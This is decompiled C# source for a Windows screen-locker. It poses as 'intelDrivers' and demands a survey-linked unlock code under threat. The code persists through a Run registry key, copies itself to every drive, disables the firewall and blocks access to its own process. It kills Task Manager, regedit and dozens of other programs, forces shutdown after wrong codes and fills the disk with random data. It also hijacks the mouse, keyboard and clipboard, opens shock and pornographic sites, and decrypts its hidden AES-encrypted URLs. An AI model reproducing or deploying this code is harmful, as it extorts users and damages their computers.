using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Micro;

public class FrmMicro : Form
{
	[Flags]
	private enum ProcessAccessRights
	{
		ProcessAllAccess = 0x1F0FFF
	}

	private const string RegKey = "intelDrivers";

	private IContainer components;

	private Button _btnUrl;

	private Label _lblText;

	private Button _btnControl;

	private TextBox _txtCode;

	private Label _lblCode;

	private Timer _tmrVolume;

	private Timer _tmrFire;

	private Timer _tmrExit;

	private Timer _tmrBeeps;

	private Timer _tmrFiles;

	private Timer _tmrMode;

	private Timer _tmrSites;

	private Timer _tmrMouse;

	private Timer _tmrSendKeys;

	private Timer _tmrOpenDisk;

	private Timer _tmrMessageBox;

	private Timer _tmrCenter;

	private Timer _tmrSetClip;

	private Timer _tmrSetReg;

	private Panel _pnlItems;

	private WebBrowser _wbrUrls;

	private bool _wr = true;

	private bool _cl;

	private int _try;

	private int _cur;

	private string[] _disables;

	private string _fHdd;

	private string _swapBtn;

	private string _tBar;

	private bool _webbrowser;

	private readonly Point _pn = Cursor.get_Position();

	private string[] _urls;

	private string[] _codes;

	private void InitializeComponent()
	{
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(61, 4));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Control)this).set_Name("FrmMicro");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(FrmMicro_FormClosing));
		((Form)this).add_Load((EventHandler)FrmConsole_Load);
		((Control)this).ResumeLayout(false);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	public FrmMicro()
	{
		InitializeComponent();
	}

	private void btnControl_Click(object sender, EventArgs e)
	{
		if (((Control)_txtCode).get_Text() == Solve(_codes[_cur], "prog"))
		{
			Correct();
		}
		else
		{
			InControl();
		}
		if (_cur == _urls.Length)
		{
			_cl = true;
			Uninstall();
			Process.GetCurrentProcess().Kill();
		}
	}

	private void InControl()
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		if (_try == 2)
		{
			FDown();
			return;
		}
		_try++;
		MessageBox.Show("Warning: " + _try + ". You can receive 2 warnings before your system becomes unusable !");
		((Control)_txtCode).ResetText();
	}

	private void Correct()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Thank you.");
		((Control)_txtCode).set_Text("");
		_cur++;
		OpenLink();
	}

	private void btnUrl_Click(object sender, EventArgs e)
	{
		OpenLink();
	}

	private void OpenLink()
	{
		try
		{
			if (!_webbrowser)
			{
				Process.Start(Solve(_urls[_cur], "prog"));
			}
			else
			{
				_wbrUrls.Navigate(Solve(_urls[_cur], "prog"));
			}
		}
		catch
		{
		}
	}

	private void FrmMicro_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!_cl)
		{
			((CancelEventArgs)(object)e).Cancel = true;
			InControl();
		}
		else
		{
			Uninstall();
			Process.GetCurrentProcess().Kill();
		}
	}

	private void Uninstall()
	{
		_tmrExit.set_Enabled(false);
		try
		{
			if (_tmrSetReg.get_Enabled())
			{
				_tmrSetReg.set_Enabled(false);
				try
				{
					Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "intelDrivers", "");
				}
				catch
				{
				}
			}
			if (_swapBtn == "y")
			{
				Swapper(0);
			}
			if (_tBar == "y")
			{
				TaskBar(1);
			}
			if (_fHdd == "y")
			{
				_wr = false;
				Thread.Sleep(1000);
				try
				{
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmp.tmp");
				}
				catch
				{
				}
			}
			Process[] processesByName = Process.GetProcessesByName("explorer");
			if (processesByName.Length == 0)
			{
				Process.Start("explorer.exe");
			}
			Protect(AceQualifier.AccessAllowed);
		}
		catch
		{
		}
	}

	private static void tmrSetReg_Tick(object sender, EventArgs e)
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "intelDrivers", Application.get_ExecutablePath());
		}
		catch
		{
		}
	}

	private void tmrCenter_Tick(object sender, EventArgs e)
	{
		((Form)this).CenterToScreen();
	}

	private static void Play()
	{
		while (true)
		{
			Console.Beep(890, 400);
			Console.Beep(990, 400);
			Console.Beep(790, 400);
			Console.Beep(390, 400);
			Console.Beep(590, 1600);
		}
	}

	private static void FDown()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = "shutdown.exe";
			process.StartInfo.Arguments = "-s -f -t 0";
			process.Start();
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int hwnd, int command);

	[DllImport("user32.dll")]
	private static extern int FindWindow(string className, string windowText);

	private static void TaskBar(int x)
	{
		try
		{
			ShowWindow(FindWindow("Shell_TrayWnd", ""), x);
		}
		catch
		{
		}
	}

	private static void StartKill()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.Id != Process.GetCurrentProcess().Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	private static extern int SwapMouseButton(int swap);

	private static void Swapper(int x)
	{
		try
		{
			SwapMouseButton(x);
		}
		catch
		{
		}
	}

	private void Lock()
	{
		while (true)
		{
			Thread.Sleep(135);
			Cursor.set_Position(_pn);
		}
	}

	private static void tmrFire_Tick(object sender, EventArgs e)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Arguments = "firewall set opmode disable";
			process.StartInfo.FileName = "netsh.exe";
			process.Start();
		}
		catch
		{
		}
	}

	private void Writer()
	{
		try
		{
			using FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tmp.tmp", FileMode.Append);
			byte[] array = new byte[1];
			while (_wr)
			{
				new Random().NextBytes(array);
				fileStream.WriteByte(array[0]);
			}
		}
		catch
		{
		}
	}

	private void tmrExit_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string[] disables = _disables;
			foreach (string value in disables)
			{
				if (process.ProcessName.ToLower().Contains(value) && process.Id != Process.GetCurrentProcess().Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
	}

	private static void Beep()
	{
		Console.Beep();
	}

	private void tmrFiles_Tick(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			_tmrFiles.set_Interval(random.Next(5000, 120001));
			switch (random.Next(0, 5))
			{
			case 0:
				Process.Start("mspaint.exe");
				break;
			case 1:
				Process.Start("write.exe");
				break;
			case 2:
				Process.Start("calc.exe");
				break;
			case 3:
				Process.Start("charmap.exe");
				break;
			case 4:
				Process.Start("notepad.exe");
				break;
			}
		}
		catch
		{
		}
	}

	private void tmrBeeps_Tick(object sender, EventArgs e)
	{
		_tmrBeeps.set_Interval(new Random().Next(1000, 15001));
		new Thread(Beep).Start();
	}

	private void tmrMode_Tick(object sender, EventArgs e)
	{
		try
		{
			_tmrMode.set_Interval(new Random().Next(1000, 120001));
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.Id != Process.GetCurrentProcess().Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private static void tmrSetClip_Tick(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText("/");
		}
		catch
		{
		}
	}

	private static void NewString()
	{
		try
		{
			Random random = new Random((int)DateTime.Now.Ticks);
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < random.Next(1, 31); i++)
			{
				char value = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
				stringBuilder.Append(value);
			}
			SendKeys.Send(stringBuilder.ToString());
		}
		catch
		{
		}
	}

	private void tmrSendKeys_Tick(object sender, EventArgs e)
	{
		_tmrSendKeys.set_Interval(new Random().Next(5000, 120001));
		NewString();
	}

	[DllImport("user32.dll")]
	private static extern IntPtr SendMessageW(IntPtr hWnd, int msg, IntPtr wParam, IntPtr lParam);

	private void Volumus()
	{
		try
		{
			SendMessageW(((Control)this).get_Handle(), 793, ((Control)this).get_Handle(), (IntPtr)524288);
		}
		catch
		{
		}
	}

	private void tmrMessageBox_Tick(object sender, EventArgs e)
	{
		_tmrMessageBox.set_Interval(new Random().Next(1000, 120001));
		Message();
	}

	private void tmrMouse_Tick(object sender, EventArgs e)
	{
		Random random = new Random();
		Point position = default(Point);
		_tmrMouse.set_Interval(random.Next(1000, 60001));
		if (random.Next(2) == 1)
		{
			position.X = Control.get_MousePosition().X + random.Next(1, 501);
		}
		else
		{
			position.X = Control.get_MousePosition().X - random.Next(1, 501);
		}
		if (random.Next(2) == 1)
		{
			position.Y = Control.get_MousePosition().Y + random.Next(1, 501);
		}
		else
		{
			position.Y = Control.get_MousePosition().Y - random.Next(1, 501);
		}
		Cursor.set_Position(position);
	}

	private void tmrVolume_Tick(object sender, EventArgs e)
	{
		_tmrVolume.set_Interval(new Random().Next(1000, 60001));
		new Thread(Volumus).Start();
	}

	private void tmrOpenDisk_Tick(object sender, EventArgs e)
	{
		_tmrOpenDisk.set_Interval(new Random().Next(5000, 60001));
		new Thread(Open).Start();
	}

	[DllImport("winmm.dll")]
	private static extern void mciSendStringA(string lpstrCommand, string lpstrReturnString, long uReturnLength, long hwndCallback);

	private static void Open()
	{
		try
		{
			mciSendStringA("set CDAudio door open", "", 127L, 0L);
		}
		catch
		{
		}
	}

	private void tmrSites_Tick(object sender, EventArgs e)
	{
		try
		{
			Random random = new Random();
			_tmrSites.set_Interval(random.Next(5000, 120000));
			switch (random.Next(0, 7))
			{
			case 0:
				Process.Start("http://www.redtube.com/redtube/gay");
				break;
			case 1:
				Process.Start("http://www.1priest1nun.com/");
				break;
			case 2:
				Process.Start("http://www.eatyoursoup.com/");
				break;
			case 3:
				Process.Start("http://www.mudfall.com/");
				break;
			case 4:
				Process.Start("http://www.1guy2needles.com/");
				break;
			case 5:
				Process.Start("http://meatspin.com");
				break;
			case 6:
				Process.Start("http://www.1girl1pitcher.org/");
				break;
			}
		}
		catch
		{
		}
	}

	private static string Solve(string txt, string pss)
	{
		try
		{
			byte[] array = Convert.FromBase64String(txt);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Mode = CipherMode.CBC;
			ICryptoTransform transform = rijndaelManaged.CreateDecryptor(new Rfc2898DeriveBytes(pss, Encoding.ASCII.GetBytes("VXGoqnoj9wv5DmJ9l9k24nLeR")).GetBytes(32), Encoding.ASCII.GetBytes("ee55zvpe74dd89u2"));
			MemoryStream memoryStream = new MemoryStream(array);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
			byte[] array2 = new byte[array.Length];
			int count = cryptoStream.Read(array2, 0, array2.Length);
			memoryStream.Close();
			cryptoStream.Close();
			return Encoding.UTF8.GetString(array2, 0, count);
		}
		catch
		{
			return null;
		}
	}

	private void Wizard(string str)
	{
		try
		{
			if (!(Application.get_StartupPath() == str))
			{
				File.Copy(Application.get_ExecutablePath(), str + "\\intelDrivers.exe");
				Process.Start(str + "\\intelDrivers.exe");
				_cl = true;
				Process.GetCurrentProcess().Kill();
			}
		}
		catch
		{
		}
	}

	private void Components()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Expected O, but got Unknown
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		//IL_018f: Expected O, but got Unknown
		//IL_01ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b7: Expected O, but got Unknown
		//IL_01d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01df: Expected O, but got Unknown
		//IL_01fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0207: Expected O, but got Unknown
		//IL_0225: Unknown result type (might be due to invalid IL or missing references)
		//IL_022f: Expected O, but got Unknown
		//IL_025d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0267: Expected O, but got Unknown
		//IL_0295: Unknown result type (might be due to invalid IL or missing references)
		//IL_029f: Expected O, but got Unknown
		//IL_02bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c7: Expected O, but got Unknown
		//IL_05b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ba: Expected O, but got Unknown
		//IL_05bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c5: Expected O, but got Unknown
		components = new Container();
		_lblText = new Label();
		_btnUrl = new Button();
		_btnControl = new Button();
		_lblCode = new Label();
		_txtCode = new TextBox();
		_tmrCenter = new Timer(components);
		_tmrCenter.set_Enabled(false);
		_tmrCenter.set_Interval(8000);
		_tmrCenter.add_Tick((EventHandler)tmrCenter_Tick);
		_tmrSites = new Timer(components);
		_tmrSites.add_Tick((EventHandler)tmrSites_Tick);
		_tmrFire = new Timer(components);
		_tmrFire.set_Interval(5000);
		_tmrFire.add_Tick((EventHandler)tmrFire_Tick);
		_tmrExit = new Timer(components);
		_tmrExit.set_Interval(200);
		_tmrExit.add_Tick((EventHandler)tmrExit_Tick);
		_tmrBeeps = new Timer(components);
		_tmrBeeps.set_Interval(1000);
		_tmrBeeps.add_Tick((EventHandler)tmrBeeps_Tick);
		_tmrFiles = new Timer(components);
		_tmrFiles.add_Tick((EventHandler)tmrFiles_Tick);
		_tmrMode = new Timer(components);
		_tmrMode.add_Tick((EventHandler)tmrMode_Tick);
		_tmrMouse = new Timer(components);
		_tmrMouse.add_Tick((EventHandler)tmrMouse_Tick);
		_tmrSendKeys = new Timer(components);
		_tmrSendKeys.add_Tick((EventHandler)tmrSendKeys_Tick);
		_tmrOpenDisk = new Timer(components);
		_tmrOpenDisk.add_Tick((EventHandler)tmrOpenDisk_Tick);
		_tmrMessageBox = new Timer(components);
		_tmrMessageBox.set_Interval(1000);
		_tmrMessageBox.add_Tick((EventHandler)tmrMessageBox_Tick);
		_tmrSetReg = new Timer(components);
		_tmrSetReg.set_Interval(1000);
		_tmrSetReg.add_Tick((EventHandler)tmrSetReg_Tick);
		_tmrVolume = new Timer(components);
		_tmrVolume.add_Tick((EventHandler)tmrVolume_Tick);
		_tmrSetClip = new Timer(components);
		_tmrSetClip.set_Interval(1000);
		_tmrSetClip.add_Tick((EventHandler)tmrSetClip_Tick);
		((Control)_lblText).set_AutoSize(true);
		((Control)_lblText).set_Name("lblText");
		((Control)_lblText).set_Size(new Size(286, 65));
		((Control)_lblText).set_Text("Please complete a survey in order to unlock your computer.\r\nEverything will be as before when you unlock your PC.\r\n\r\nDon't do this, and you'll see what happens.\r\nThank you for your cooperation.");
		((Control)_btnUrl).set_Name("btnUrl");
		((Control)_btnUrl).add_Click((EventHandler)btnUrl_Click);
		((Control)_btnUrl).set_Size(new Size(75, 23));
		((Control)_btnUrl).set_Text("Site");
		((Control)_btnControl).set_Name("btnControl");
		((Control)_btnControl).set_Text("Verify");
		((Control)_btnControl).set_Size(new Size(75, 23));
		((Control)_btnControl).add_Click((EventHandler)btnControl_Click);
		((Control)_txtCode).set_Name("txtCode");
		_txtCode.set_TextAlign((HorizontalAlignment)2);
		((Control)_lblCode).set_AutoSize(true);
		((Control)_lblCode).set_Name("lblCode");
		((Control)_lblCode).set_Size(new Size(71, 13));
		((Control)_lblCode).set_Text("Unlock code:");
		((Form)this).set_AcceptButton((IButtonControl)(object)_btnControl);
		if (!_webbrowser)
		{
			((Control)this).SuspendLayout();
			((Control)_btnUrl).set_Location(new Point(17, 103));
			((Control)_btnUrl).set_TabIndex(14);
			((ButtonBase)_btnUrl).set_UseVisualStyleBackColor(true);
			((Control)_lblText).set_Location(new Point(14, 9));
			((Control)_lblText).set_TabIndex(13);
			((Control)_btnControl).set_Location(new Point(224, 103));
			((Control)_btnControl).set_TabIndex(12);
			((ButtonBase)_btnControl).set_UseVisualStyleBackColor(true);
			((Control)_txtCode).set_Location(new Point(91, 77));
			((Control)_txtCode).set_Size(new Size(208, 20));
			((Control)_txtCode).set_TabIndex(11);
			((Control)_lblCode).set_Location(new Point(14, 80));
			((Control)_lblCode).set_TabIndex(10);
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Form)this).set_ClientSize(new Size(314, 137));
			((Control)this).get_Controls().Add((Control)(object)_btnUrl);
			((Control)this).get_Controls().Add((Control)(object)_lblText);
			((Control)this).get_Controls().Add((Control)(object)_btnControl);
			((Control)this).get_Controls().Add((Control)(object)_txtCode);
			((Control)this).get_Controls().Add((Control)(object)_lblCode);
			((Control)this).ResumeLayout(false);
			((Control)this).PerformLayout();
		}
		else
		{
			_pnlItems = new Panel();
			_wbrUrls = new WebBrowser();
			((Control)_pnlItems).SuspendLayout();
			((Control)this).SuspendLayout();
			((Control)_pnlItems).set_BackColor(Color.Black);
			((Control)_pnlItems).get_Controls().Add((Control)(object)_lblText);
			((Control)_pnlItems).get_Controls().Add((Control)(object)_btnUrl);
			((Control)_pnlItems).get_Controls().Add((Control)(object)_btnControl);
			((Control)_pnlItems).get_Controls().Add((Control)(object)_lblCode);
			((Control)_pnlItems).get_Controls().Add((Control)(object)_txtCode);
			((Control)_pnlItems).set_Dock((DockStyle)2);
			((Control)_pnlItems).set_Location(new Point(0, 401));
			((Control)_pnlItems).set_Name("pnlItems");
			((Control)_pnlItems).set_Size(new Size(804, 87));
			((Control)_pnlItems).set_TabIndex(4);
			((Control)_lblText).set_BackColor(Color.Transparent);
			((Control)_lblText).set_ForeColor(Color.White);
			((Control)_lblText).set_Location(new Point(506, 10));
			((Control)_lblText).set_TabIndex(4);
			((Control)_btnUrl).set_BackColor(SystemColors.Control);
			((Control)_btnUrl).set_ForeColor(Color.Black);
			((Control)_btnUrl).set_Location(new Point(12, 52));
			((Control)_btnUrl).set_TabIndex(3);
			((ButtonBase)_btnUrl).set_UseVisualStyleBackColor(false);
			((Control)_btnControl).set_BackColor(SystemColors.Control);
			((Control)_btnControl).set_ForeColor(Color.Black);
			((Control)_btnControl).set_Location(new Point(137, 52));
			((Control)_btnControl).set_TabIndex(2);
			((ButtonBase)_btnControl).set_UseVisualStyleBackColor(false);
			((Control)_lblCode).set_BackColor(Color.Transparent);
			((Control)_lblCode).set_ForeColor(Color.White);
			((Control)_lblCode).set_Location(new Point(9, 10));
			((Control)_lblCode).set_TabIndex(1);
			((Control)_txtCode).set_Location(new Point(12, 26));
			((Control)_txtCode).set_Size(new Size(200, 20));
			((Control)_txtCode).set_TabIndex(0);
			((Control)_wbrUrls).set_Dock((DockStyle)5);
			_wbrUrls.set_IsWebBrowserContextMenuEnabled(false);
			((Control)_wbrUrls).set_Location(new Point(0, 0));
			((Control)_wbrUrls).set_MinimumSize(new Size(20, 20));
			((Control)_wbrUrls).set_Name("wbrUrls");
			_wbrUrls.set_ScriptErrorsSuppressed(true);
			((Control)_wbrUrls).set_Size(new Size(804, 488));
			((Control)_wbrUrls).set_TabIndex(5);
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Form)this).set_ClientSize(new Size(804, 488));
			((Control)this).get_Controls().Add((Control)(object)_pnlItems);
			((Control)this).get_Controls().Add((Control)(object)_wbrUrls);
			((Control)_pnlItems).ResumeLayout(false);
			((Control)_pnlItems).PerformLayout();
			((Control)this).ResumeLayout(false);
		}
		((Form)this).CenterToScreen();
	}

	private void FrmConsole_Load(object sender, EventArgs e)
	{
		Components();
		try
		{
			Wizard(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			_swapBtn = "%swapmouse%";
			_tBar = "%hidetaskbar%";
			_disables = "taskmgr.cmd.msconfig.wmplayer.calc.notepad.regedit.skype.aim.steam.origin.utorrent.bittorrent.desura.powershell.winrar.winword.excel.powerpnt.outlook.vlc.javaw.mirc.ccleaner.poweriso.mspaint.photoshop.teamviewer.defraggler.moviemaker.wireshark.acrord.rstrui.filezilla.vmware.tbb-firefox.torch.manycam.gimp.openvpntray.itunes.pidgin.recuva.7zfm.thunderbird.paintdotnet".Split(new char[1] { '.' });
			_fHdd = "%filldisk%";
			string[] separator = new string[1] { "]||[" };
			_urls = "F7+daSNE0du6aEsYvGptBpOx0Dt0d7/jlwubSN2I3oI=".Split(separator, StringSplitOptions.None);
			_codes = "dgUTMfWxFCPF+8aIjDUkbw==".Split(separator, StringSplitOptions.None);
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array = drives;
				foreach (DriveInfo driveInfo in array)
				{
					try
					{
						File.Copy(Application.get_ExecutablePath(), string.Concat(driveInfo.RootDirectory, Path.GetFileName(Application.get_ExecutablePath())));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			_tmrSetReg.set_Enabled(true);
			int.TryParse("%waittime%", out var result);
			Protect(AceQualifier.AccessDenied);
			if (result != 0)
			{
				Thread.Sleep(result);
			}
			if (_disables[0] != "")
			{
				_tmrExit.set_Enabled(true);
			}
			_tmrSetClip.set_Enabled(true);
			_tmrMouse.set_Enabled(true);
			if (_swapBtn == "y")
			{
				Swapper(1);
			}
			if (_tBar == "y")
			{
				TaskBar(0);
			}
			if (_fHdd == "y")
			{
				new Thread(Writer).Start();
			}
			Process.Start(Solve(_urls[_cur], "prog"));
			_tmrCenter.set_Interval(int.Parse("5000"));
			_tmrCenter.set_Enabled(true);
			((Control)this).Focus();
		}
		catch
		{
		}
	}

	private void RemoveDate()
	{
		try
		{
			while (true)
			{
				if (DateTime.UtcNow >= DateTime.Parse("dd/mm/yyyy hh:mm:ss"))
				{
					_cl = true;
					Uninstall();
					Process.GetCurrentProcess().Kill();
				}
				Thread.Sleep(1000);
			}
		}
		catch
		{
		}
	}

	private static void Calculator()
	{
		int num = 1;
		while (true)
		{
			if (num == 80)
			{
				num = 0;
			}
			num++;
		}
	}

	private static void Message()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		Form val = new Form();
		val.set_Size(new Size(1, 1));
		val.set_StartPosition((FormStartPosition)0);
		Rectangle virtualScreen = SystemInformation.get_VirtualScreen();
		val.set_Location(new Point(virtualScreen.Bottom + 10, virtualScreen.Right + 10));
		((Control)val).Show();
		((Control)val).Focus();
		((Control)val).BringToFront();
		val.set_TopMost(true);
		val.set_ShowIcon(false);
		val.set_ShowInTaskbar(false);
		MessageBox.Show((IWin32Window)(object)val, "Please complete the survey", string.Empty, (MessageBoxButtons)0);
		((Component)(object)val).Dispose();
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	private static void Protect(AceQualifier ace)
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor processSecurityDescript = GetProcessSecurityDescript(currentProcess);
			processSecurityDescript.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, ace, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			byte[] array = new byte[processSecurityDescript.BinaryLength];
			processSecurityDescript.GetBinaryForm(array, 0);
			SetKernelObjectSecurity(currentProcess, 4, array);
		}
		catch
		{
		}
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	private static RawSecurityDescriptor GetProcessSecurityDescript(IntPtr prHandle)
	{
		try
		{
			byte[] pSecurityDescriptor = new byte[0];
			GetKernelObjectSecurity(prHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
			if ((long)lpnLengthNeeded > 32767L)
			{
				return null;
			}
			return (!GetKernelObjectSecurity(prHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded)) ? null : new RawSecurityDescriptor(pSecurityDescriptor, 0);
		}
		catch
		{
			return null;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();
}
